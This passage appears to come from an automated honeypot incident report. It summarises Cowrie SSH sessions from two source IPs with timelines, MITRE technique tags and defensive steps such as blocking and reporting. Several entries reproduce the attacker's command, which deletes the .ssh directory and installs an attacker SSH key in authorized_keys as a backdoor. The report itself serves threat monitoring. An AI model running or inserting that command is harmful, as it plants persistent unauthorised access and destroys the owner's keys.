| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:20:43` | `cowrie.session.connect` |
| `2026-06-03 06:20:43` | `cowrie.client.version` |
| `2026-06-03 06:20:43` | `cowrie.client.kex` |
| `2026-06-03 06:20:43` | `cowrie.login.success` |
| `2026-06-03 06:20:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a1edbf7f1b6

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 06:26 |
| **Last Seen** | 2026-06-03 06:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:26:54` | `cowrie.session.connect` |
| `2026-06-03 06:26:54` | `cowrie.client.version` |
| `2026-06-03 06:26:54` | `cowrie.client.kex` |
| `2026-06-03 06:26:54` | `cowrie.login.success` |
| `2026-06-03 06:26:55` | `cowrie.session.params` |
| `2026-06-03 06:26:55` | `cowrie.command.input` |
| `2026-06-03 06:26:55` | `cowrie.command.failed` |
| `2026-06-03 06:26:55` | `cowrie.log.closed` |
| `2026-06-03 06:26:55` | `cowrie.session.params` |
| `2026-06-03 06:26:55` | `cowrie.command.input` |
| `2026-06-03 06:26:55` | `cowrie.session.file_download` |
| `2026-06-03 06:26:55` | `cowrie.log.closed` |
| `2026-06-03 06:26:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd02f3022b49

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 06:26 |
| **Last Seen** | 2026-06-03 06:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:26:57` | `cowrie.session.connect` |
| `2026-06-03 06:26:57` | `cowrie.client.version` |
| `2026-06-03 06:26:57` | `cowrie.client.kex` |
| `2026-06-03 06:26:58` | `cowrie.login.success` |
| `2026-06-03 06:26:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11b9056936c5

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 06:27 |
| **Last Seen** | 2026-06-03 06:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:27:15` | `cowrie.session.connect` |
| `2026-06-03 06:27:15` | `cowrie.client.version` |
| `2026-06-03 06:27:15` | `cowrie.client.kex` |
| `2026-06-03 06:27:17` | `cowrie.login.success` |
| `2026-06-03 06:27:17` | `cowrie.session.params` |
| `2026-06-03 06:27:17` | `cowrie.command.input` |
| `2026-06-03 06:27:17` | `cowrie.command.failed` |
| `2026-06-03 06:27:18` | `cowrie.log.closed` |
| `2026-06-03 06:27:18` | `cowrie.session.params` |
| `2026-06-03 06:27:18` | `cowrie.command.input` |
| `2026-06-03 06:27:19` | `cowrie.session.file_download` |
| `2026-06-03 06:27:19` | `cowrie.log.closed` |
| `2026-06-03 06:27:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f12b4a32b62

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 06:27 |
| **Last Seen** | 2026-06-03 06:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:27:22` | `cowrie.session.connect` |
| `2026-06-03 06:27:22` | `cowrie.client.version` |
| `2026-06-03 06:27:22` | `cowrie.client.kex` |
| `2026-06-03 06:27:24` | `cowrie.login.success` |
| `2026-06-03 06:27:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb99940fde53

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 06:29 |
| **Last Seen** | 2026-06-03 06:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:29:28` | `cowrie.session.connect` |
| `2026-06-03 06:29:28` | `cowrie.client.version` |
| `2026-06-03 06:29:29` | `cowrie.client.kex` |
| `2026-06-03 06:29:30` | `cowrie.login.success` |
| `2026-06-03 06:29:30` | `cowrie.session.params` |
| `2026-06-03 06:29:30` | `cowrie.command.input` |
| `2026-06-03 06:29:30` | `cowrie.command.failed` |
| `2026-06-03 06:29:31` | `cowrie.log.closed` |
| `2026-06-03 06:29:31` | `cowrie.session.params` |
| `2026-06-03 06:29:31` | `cowrie.command.input` |
| `2026-06-03 06:29:32` | `cowrie.session.file_download` |
| `2026-06-03 06:29:32` | `cowrie.log.closed` |
| `2026-06-03 06:29:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90359663a5f2

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 06:29 |
| **Last Seen** | 2026-06-03 06:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:29:35` | `cowrie.session.connect` |
| `2026-06-03 06:29:35` | `cowrie.client.version` |
| `2026-06-03 06:29:36` | `cowrie.client.kex` |
| `2026-06-03 06:29:37` | `cowrie.login.success` |
| `2026-06-03 06:29:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90b4287e4319

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 06:31 |
| **Last Seen** | 2026-06-03 06:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:31:44` | `cowrie.session.connect` |
| `2026-06-03 06:31:44` | `cowrie.client.version` |
| `2026-06-03 06:31:44` | `cowrie.client.kex` |
| `2026-06-03 06:31:45` | `cowrie.login.success` |
| `2026-06-03 06:31:46` | `cowrie.session.params` |
| `2026-06-03 06:31:46` | `cowrie.command.input` |
| `2026-06-03 06:31:46` | `cowrie.command.failed` |
| `2026-06-03 06:31:47` | `cowrie.log.closed` |
| `2026-06-03 06:31:47` | `cowrie.session.params` |
| `2026-06-03 06:31:47` | `cowrie.command.input` |
| `2026-06-03 06:31:47` | `cowrie.session.file_download` |
| `2026-06-03 06:31:47` | `cowrie.log.closed` |
| `2026-06-03 06:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa25c91958a5

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 06:31 |
| **Last Seen** | 2026-06-03 06:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:31:51` | `cowrie.session.connect` |
| `2026-06-03 06:31:51` | `cowrie.client.version` |
| `2026-06-03 06:31:51` | `cowrie.client.kex` |
| `2026-06-03 06:31:52` | `cowrie.login.success` |
| `2026-06-03 06:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3352a7d59927

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 06:37 |
| **Last Seen** | 2026-06-03 06:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:37:08` | `cowrie.session.connect` |
| `2026-06-03 06:37:08` | `cowrie.client.version` |
| `2026-06-03 06:37:08` | `cowrie.client.kex` |
| `2026-06-03 06:37:09` | `cowrie.login.success` |
| `2026-06-03 06:37:09` | `cowrie.session.params` |
| `2026-06-03 06:37:09` | `cowrie.command.input` |
| `2026-06-03 06:37:09` | `cowrie.command.failed` |
| `2026-06-03 06:37:09` | `cowrie.log.closed` |
| `2026-06-03 06:37:09` | `cowrie.session.params` |
| `2026-06-03 06:37:09` | `cowrie.command.input` |
| `2026-06-03 06:37:09` | `cowrie.session.file_download` |
| `2026-06-03 06:37:09` | `cowrie.log.closed` |
| `2026-06-03 06:37:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aec2d68022e1

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 06:37 |
| **Last Seen** | 2026-06-03 06:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:37:11` | `cowrie.session.connect` |
| `2026-06-03 06:37:11` | `cowrie.client.version` |
| `2026-06-03 06:37:11` | `cowrie.client.kex` |
| `2026-06-03 06:37:12` | `cowrie.login.success` |
| `2026-06-03 06:37:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43e66a4cf5e8

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 06:38 |
| **Last Seen** | 2026-06-03 06:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:38:24` | `cowrie.session.connect` |
| `2026-06-03 06:38:24` | `cowrie.client.version` |
| `2026-06-03 06:38:24` | `cowrie.client.kex` |
| `2026-06-03 06:38:25` | `cowrie.login.success` |
| `2026-06-03 06:38:26` | `cowrie.session.params` |
| `2026-06-03 06:38:26` | `cowrie.command.input` |
| `2026-06-03 06:38:26` | `cowrie.command.failed` |
| `2026-06-03 06:38:27` | `cowrie.log.closed` |
| `2026-06-03 06:38:27` | `cowrie.session.params` |
| `2026-06-03 06:38:27` | `cowrie.command.input` |
| `2026-06-03 06:38:27` | `cowrie.session.file_download` |
| `2026-06-03 06:38:27` | `cowrie.log.closed` |
| `2026-06-03 06:38:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c21ff9873617

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 06:38 |
| **Last Seen** | 2026-06-03 06:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:38:31` | `cowrie.session.connect` |
| `2026-06-03 06:38:31` | `cowrie.client.version` |
| `2026-06-03 06:38:31` | `cowrie.client.kex` |
| `2026-06-03 06:38:32` | `cowrie.login.success` |
| `2026-06-03 06:38:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e21501764193

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 06:45 |
| **Last Seen** | 2026-06-03 06:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:45:17` | `cowrie.session.connect` |
| `2026-06-03 06:45:17` | `cowrie.client.version` |
| `2026-06-03 06:45:17` | `cowrie.client.kex` |
| `2026-06-03 06:45:18` | `cowrie.login.success` |
| `2026-06-03 06:45:18` | `cowrie.session.params` |
| `2026-06-03 06:45:18` | `cowrie.command.input` |
| `2026-06-03 06:45:18` | `cowrie.command.failed` |
| `2026-06-03 06:45:18` | `cowrie.log.closed` |
| `2026-06-03 06:45:18` | `cowrie.session.params` |
| `2026-06-03 06:45:18` | `cowrie.command.input` |
| `2026-06-03 06:45:19` | `cowrie.session.file_download` |
| `2026-06-03 06:45:19` | `cowrie.log.closed` |
| `2026-06-03 06:45:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94ff4c7c384e

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 06:45 |
| **Last Seen** | 2026-06-03 06:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:45:20` | `cowrie.session.connect` |
| `2026-06-03 06:45:20` | `cowrie.client.version` |
| `2026-06-03 06:45:20` | `cowrie.client.kex` |
| `2026-06-03 06:45:21` | `cowrie.login.success` |
| `2026-06-03 06:45:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b716244f7a6

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 06:47 |
| **Last Seen** | 2026-06-03 06:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:47:16` | `cowrie.session.connect` |
| `2026-06-03 06:47:16` | `cowrie.client.version` |
| `2026-06-03 06:47:16` | `cowrie.client.kex` |
| `2026-06-03 06:47:17` | `cowrie.login.success` |
| `2026-06-03 06:47:18` | `cowrie.session.params` |
| `2026-06-03 06:47:18` | `cowrie.command.input` |
| `2026-06-03 06:47:18` | `cowrie.command.failed` |
| `2026-06-03 06:47:19` | `cowrie.log.closed` |
| `2026-06-03 06:47:19` | `cowrie.session.params` |
| `2026-06-03 06:47:19` | `cowrie.command.input` |
| `2026-06-03 06:47:19` | `cowrie.session.file_download` |
| `2026-06-03 06:47:19` | `cowrie.log.closed` |
| `2026-06-03 06:47:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7014b4485cd

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 06:47 |
| **Last Seen** | 2026-06-03 06:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:47:23` | `cowrie.session.connect` |
| `2026-06-03 06:47:23` | `cowrie.client.version` |
| `2026-06-03 06:47:23` | `cowrie.client.kex` |
| `2026-06-03 06:47:23` | `cowrie.login.success` |
| `2026-06-03 06:47:24` | `cowrie.session.params` |
